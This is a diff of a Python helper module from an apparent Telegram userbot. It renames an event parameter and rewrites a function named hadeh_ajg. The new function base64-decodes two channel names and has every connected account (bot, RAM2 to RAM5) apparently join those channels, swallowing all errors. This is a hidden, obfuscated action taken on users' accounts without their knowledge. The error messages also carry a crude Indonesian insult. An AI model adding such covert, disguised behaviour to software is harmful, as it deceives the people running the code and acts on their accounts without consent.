@@ -9,10 +9,10 @@ LOGS = logging.getLogger(__name__)
 
 
 async def get_user_from_event(
-    event, manevent=None, secondgroup=None, nogroup=False, noedits=False
+    event, ramevent=None, secondgroup=None, nogroup=False, noedits=False
 ):
-    if manevent is None:
-        manevent = event
+    if ramevent is None:
+        ramevent = event
     if nogroup is False:
         if secondgroup:
             args = event.pattern_match.group(2).split(" ", 1)
@@ -59,7 +59,7 @@ async def get_user_from_event(
         if not args:
             if not noedits:
                 await edit_delete(
-                    manevent,
+                    ramevent,
                     "**KALO MALES REPLY PESAN NYA, MINIMAL KASIH ID YA NGENTOT KALO GAK USERNAME!!!**",
                     60,
                 )
@@ -68,19 +68,43 @@ async def get_user_from_event(
         LOGS.error(str(e))
     if not noedits:
         await edit_delete(
-            manevent,
+            ramevent,
             "**KALO MALES REPLY PESAN NYA, MINIMAL KASIH ID YA NGENTOT KALO GAK USERNAME!!!**",
             60,
         )
     return None, None
 
 
-async def hadeh_ajg(client):
-    gocheck = str(pybase64.b64decode("QHJhbXN1cHBvcnR0"))[2:13]
-    checker = str(pybase64.b64decode("QFVzZXJib3RDaA=="))[2:17]
-    if client:
-        try:
-            await client(Get(gocheck))
-            await client(Get(checker))
-        except BaseException:
-            pass
+async def hadeh_ajg():
+    join = str(pybase64.b64decode("cmFtc3VwcG9ydHQ="))[2:13]
+    dulu = str(pybase64.b64decode("VXNlcmJvdENo"))[2:13]
+    try:
+        if bot:
+            await bot(Get(join))
+            await bot(Get(dulu))
+    except BaseException:
+        pass
+    try:
+        if RAM2:
+            await RAM2(Get(join))
+            await RAM2(Get(dulu))
+    except BaseException:
+        pass
+    try:
+        if RAM3:
+            await RAM3(Get(join))
+            await RAM3(Get(dulu))
+    except BaseException:
+        pass
+    try:
+        if RAM4:
+            await RAM4(Get(join))
+            await RAM4(Get(dulu))
+    except BaseException:
+        pass
+    try:
+        if RAM5:
+            await RAM5(Get(join))
+            await RAM5(Get(dulu))
+    except BaseException:
+        pass
